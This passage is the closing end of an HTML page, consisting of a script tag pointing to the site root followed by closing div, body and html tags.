src="/"></script></div></body></html>
